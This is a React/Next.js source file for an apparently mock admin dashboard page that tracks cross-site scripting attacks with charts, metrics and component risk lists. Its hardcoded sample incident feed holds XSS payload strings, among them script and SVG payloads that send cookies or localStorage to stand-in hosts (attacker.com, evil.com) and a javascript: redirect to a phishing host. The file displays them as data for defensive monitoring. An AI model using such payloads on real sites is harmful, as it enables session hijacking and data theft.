"use client";

import { useState } from "react";
import AdminSidebar from "@/components/admin_sidebar";
import {
  AlertTriangle,
  Ban,
  Shield,
  Bug,
  Globe,
  Activity,
  TrendingDown,
  Clock,
  Code,
} from "lucide-react";
import {
  Area,
  AreaChart,
  Bar,
  BarChart,
  ResponsiveContainer,
  Tooltip,
  XAxis,
  YAxis,
  Pie,
  PieChart,
  Cell,
} from "recharts";

const incidentData = [
  { time: "00:00", count: 23, blocked: 22 },
  { time: "04:00", count: 15, blocked: 15 },
  { time: "08:00", count: 67, blocked: 64 },
  { time: "12:00", count: 112, blocked: 108 },
  { time: "16:00", count: 189, blocked: 182 },
  { time: "20:00", count: 134, blocked: 128 },
  { time: "24:00", count: 56, blocked: 54 },
];

const attackTypes = [
  { name: "Script Tag", value: 38, color: "#f97316" },
  { name: "Event Handler", value: 27, color: "#eab308" },
  { name: "iframe Inject", value: 18, color: "#ef4444" },
  { name: "SVG Payload", value: 10, color: "#3b82f6" },
  { name: "Data URI", value: 7, color: "#22c55e" },
];

const recentIncidents = [
  { id: 1, source: "103.45.67.89", payload: "<script>document.location='https://attacker.com/?c='+document.cookie</script>", target: "/api/comments", blocked: true, time: "3 min ago" },
  { id: 2, source: "185.220.101.45", payload: "<img src=x onerror=alert(1)>", target: "/api/search", blocked: true, time: "9 min ago" },
  { id: 3, source: "45.33.32.156", payload: "<svg/onload=fetch('https://evil.com?d='+localStorage)>", target: "/api/profile", blocked: true, time: "18 min ago" },
  { id: 4, source: "198.51.100.23", payload: "<body onload=document.forms[0].submit()>", target: "/api/contact", blocked: false, time: "25 min ago" },
  { id: 5, source: "172.16.0.88", payload: "javascript:document.location='https://phish.com'", target: "/api/feedback", blocked: true, time: "32 min ago" },
];

const vulnerableComponents = [
  { component: "Comment Section", risk: "Critical", attempts: 856, lastAttack: "3 min ago" },
  { component: "Search Input", risk: "High", attempts: 623, lastAttack: "9 min ago" },
  { component: "User Profile", risk: "High", attempts: 412, lastAttack: "18 min ago" },
  { component: "Contact Form", risk: "Medium", attempts: 198, lastAttack: "25 min ago" },
];

export default function XSSPage() {
  const [timeRange, setTimeRange] = useState("24h");

  return (
    <div className="min-h-screen bg-[#0d1117] font-sans">
      <AdminSidebar />
      <main className="ml-72 min-h-screen overflow-y-auto">
        <div className="p-8">
          {/* Header */}
          <div className="mb-8">
            <div className="flex items-center gap-3 mb-2">
              <div className="p-2 rounded-lg bg-orange-500/20 border border-orange-500/30">
                <Code className="w-6 h-6 text-orange-400" />
              </div>
              <div>
                <h1 className="text-2xl font-bold text-white">XSS Attacks</h1>
                <p className="text-sm text-zinc-400">Cross-Site Scripting Threat Analysis</p>
              </div>
            </div>
            <p className="text-zinc-400 text-sm max-w-2xl mt-2">
              XSS attacks inject malicious scripts into web pages viewed by other users, enabling attackers to steal 
              session tokens, credentials, or perform actions on behalf of victims.
            </p>
          </div>

          {/* Metrics */}
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4 mb-8">
            <div className="rounded-lg border border-orange-500/20 bg-[#0d1117] p-5 bg-linear-to-br from-orange-500/20 to-transparent">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-[11px] font-bold uppercase tracking-[0.18em] text-zinc-400">Total Attempts</p>
                  <p className="mt-2 text-3xl font-black text-white">596</p>
                  <p className="mt-1 text-xs text-orange-400 flex items-center gap-1">
                    <TrendingDown className="w-3 h-3" /> +8% from yesterday
                  </p>
                </div>
                <AlertTriangle className="w-8 h-8 text-orange-400" />
              </div>
            </div>

            <div className="rounded-lg border border-orange-500/20 bg-[#0d1117] p-5 bg-linear-to-br from-orange-500/20 to-transparent">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-[11px] font-bold uppercase tracking-[0.18em] text-zinc-400">Blocked</p>
                  <p className="mt-2 text-3xl font-black text-white">573</p>
                  <p className="mt-1 text-xs text-emerald-400">96.1% success rate</p>
                </div>
                <Ban className="w-8 h-8 text-orange-400" />
              </div>
            </div>

            <div className="rounded-lg border border-yellow-500/20 bg-[#0d1117] p-5 bg-linear-to-br from-yellow-500/20 to-transparent">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-[11px] font-bold uppercase tracking-[0.18em] text-zinc-400">Bypassed WAF</p>
                  <p className="mt-2 text-3xl font-black text-white">23</p>
                  <p className="mt-1 text-xs text-yellow-400">Requires investigation</p>
                </div>
                <Bug className="w-8 h-8 text-yellow-400" />
              </div>
            </div>

            <div className="rounded-lg border border-orange-500/20 bg-[#0d1117] p-5 bg-linear-to-br from-orange-500/20 to-transparent">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-[11px] font-bold uppercase tracking-[0.18em] text-zinc-400">Affected Pages</p>
                  <p className="mt-2 text-3xl font-black text-white">4</p>
                  <p className="mt-1 text-xs text-zinc-400">Components</p>
                </div>
                <Globe className="w-8 h-8 text-orange-400" />
              </div>
            </div>
          </div>

          {/* Charts Row */}
          <div className="grid grid-cols-1 lg:grid-cols-3 gap-6 mb-8">
            {/* Timeline Chart */}
            <div className="lg:col-span-2 rounded-xl border border-orange-500/20 bg-[#0d1117] p-5">
              <div className="flex items-center justify-between mb-6">
                <div>
                  <h3 className="text-base font-bold text-white">Attack Timeline</h3>
                  <p className="text-xs text-zinc-500">XSS attempts over last 24 hours</p>
                </div>
                <div className="flex gap-2">
                  {["1h", "6h", "24h", "7d"].map((range) => (
                    <button
                      key={range}
                      onClick={() => setTimeRange(range)}
                      className={`px-3 py-1.5 rounded-lg text-xs font-medium transition-colors ${
                        timeRange === range
                          ? "bg-orange-500/20 text-orange-400 border border-orange-500/30"
                          : "text-zinc-400 hover:text-white hover:bg-zinc-800"
                      }`}
                    >
                      {range}
                    </button>
                  ))}
                </div>
              </div>
              <div className="h-64">
                <ResponsiveContainer width="100%" height="100%">
                  <AreaChart data={incidentData}>
                    <defs>
                      <linearGradient id="colorTotal" x1="0" y1="0" x2="0" y2="1">
                        <stop offset="5%" stopColor="#f97316" stopOpacity={0.3} />
                        <stop offset="95%" stopColor="#f97316" stopOpacity={0} />
                      </linearGradient>
                      <linearGradient id="colorBlocked" x1="0" y1="0" x2="0" y2="1">
                        <stop offset="5%" stopColor="#22c55e" stopOpacity={0.3} />
                        <stop offset="95%" stopColor="#22c55e" stopOpacity={0} />
                      </linearGradient>
                    </defs>
                    <XAxis dataKey="time" stroke="#52525b" fontSize={11} />
                    <YAxis stroke="#52525b" fontSize={11} />
                    <Tooltip
                      contentStyle={{ backgroundColor: "#18181b", border: "1px solid #3f3f46", borderRadius: "8px" }}
                      labelStyle={{ color: "#a1a1aa" }}
                    />
                    <Area type="monotone" dataKey="count" stroke="#f97316" fill="url(#colorTotal)" strokeWidth={2} name="Total" />
                    <Area type="monotone" dataKey="blocked" stroke="#22c55e" fill="url(#colorBlocked)" strokeWidth={2} name="Blocked" />
                  </AreaChart>
                </ResponsiveContainer>
              </div>
            </div>

            {/* Attack Types Pie */}
            <div className="rounded-xl border border-orange-500/20 bg-[#0d1117] p-5">
              <div className="mb-6">
                <h3 className="text-base font-bold text-white">Attack Vectors</h3>
                <p className="text-xs text-zinc-500">Distribution by technique</p>
              </div>
              <div className="h-48">
                <ResponsiveContainer width="100%" height="100%">
                  <PieChart>
                    <Pie
                      data={attackTypes}
                      cx="50%"
                      cy="50%"
                      innerRadius={50}
                      outerRadius={70}
                      paddingAngle={4}
                      dataKey="value"
                    >
                      {attackTypes.map((entry, index) => (
                        <Cell key={`cell-${index}`} fill={entry.color} />
                      ))}
                    </Pie>
                    <Tooltip
                      contentStyle={{ backgroundColor: "#18181b", border: "1px solid #3f3f46", borderRadius: "8px" }}
                    />
                  </PieChart>
                </ResponsiveContainer>
              </div>
              <div className="mt-4 space-y-2">
                {attackTypes.map((type) => (
                  <div key={type.name} className="flex items-center justify-between text-xs">
                    <div className="flex items-center gap-2">
                      <div className="w-2 h-2 rounded-full" style={{ backgroundColor: type.color }} />
                      <span className="text-zinc-400">{type.name}</span>
                    </div>
                    <span className="text-white font-medium">{type.value}%</span>
                  </div>
                ))}
              </div>
            </div>
          </div>

          {/* Bottom Row */}
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
            {/* Recent Incidents */}
            <div className="rounded-xl border border-orange-500/20 bg-[#0d1117] p-5">
              <div className="mb-4 flex items-center justify-between">
                <div>
                  <h3 className="text-base font-bold text-white">Recent Incidents</h3>
                  <p className="text-xs text-zinc-500">Live XSS attack feed</p>
                </div>
                <span className="px-2 py-1 rounded-full bg-orange-500/20 text-orange-400 text-xs font-medium border border-orange-500/30">
                  Live
                </span>
              </div>
              <div className="space-y-3">
                {recentIncidents.map((incident) => (
                  <div
                    key={incident.id}
                    className="flex items-center justify-between p-3 rounded-lg border border-zinc-800 bg-zinc-900/50"
                  >
                    <div className="flex items-center gap-3">
                      <div className={`p-1.5 rounded-lg ${incident.blocked ? "bg-emerald-500/20" : "bg-orange-500/20"}`}>
                        {incident.blocked ? (
                          <Shield className="w-4 h-4 text-emerald-400" />
                        ) : (
                          <AlertTriangle className="w-4 h-4 text-orange-400" />
                        )}
                      </div>
                      <div>
                        <p className="text-sm text-zinc-300 font-mono">{incident.source}</p>
                        <p className="text-xs text-orange-400 truncate max-w-56">{incident.payload}</p>
                      </div>
                    </div>
                    <div className="text-right">
                      <p className="text-xs text-zinc-500">{incident.target}</p>
                      <p className="text-xs text-zinc-400 flex items-center gap-1 mt-1">
                        <Clock className="w-3 h-3" /> {incident.time}
                      </p>
                    </div>
                  </div>
                ))}
              </div>
            </div>

            {/* Vulnerable Components */}
            <div className="rounded-xl border border-orange-500/20 bg-[#0d1117] p-5">
              <div className="mb-4">
                <h3 className="text-base font-bold text-white">Vulnerable Components</h3>
                <p className="text-xs text-zinc-500">User input fields requiring sanitization</p>
              </div>
              <div className="space-y-3">
                {vulnerableComponents.map((comp, i) => (
                  <div
                    key={i}
                    className="flex items-center justify-between p-3 rounded-lg border border-zinc-800 bg-zinc-900/50"
                  >
                    <div className="flex items-center gap-3">
                      <Code className="w-4 h-4 text-zinc-500" />
                      <div>
                        <p className="text-sm text-zinc-300">{comp.component}</p>
                        <p className="text-xs text-zinc-500 mt-0.5">{comp.attempts.toLocaleString()} attempts</p>
                      </div>
                    </div>
                    <div className="text-right">
                      <span className={`px-2 py-1 rounded-full text-xs font-medium border ${
                        comp.risk === "Critical" ? "bg-red-500/20 text-red-400 border-red-500/30" :
                        comp.risk === "High" ? "bg-orange-500/20 text-orange-400 border-orange-500/30" :
                        "bg-yellow-500/20 text-yellow-400 border-yellow-500/30"
                      }`}>
                        {comp.risk}
                      </span>
                      <p className="text-xs text-zinc-500 mt-1">{comp.lastAttack}</p>
                    </div>
                  </div>
                ))}
              </div>
              <button className="mt-4 w-full py-2.5 rounded-lg border border-orange-500/30 text-orange-400 text-sm font-medium hover:bg-orange-500/10 transition-colors">
                Implement Content Security Policy
              </button>
            </div>
          </div>
        </div>
      </main>
    </div>
  );
}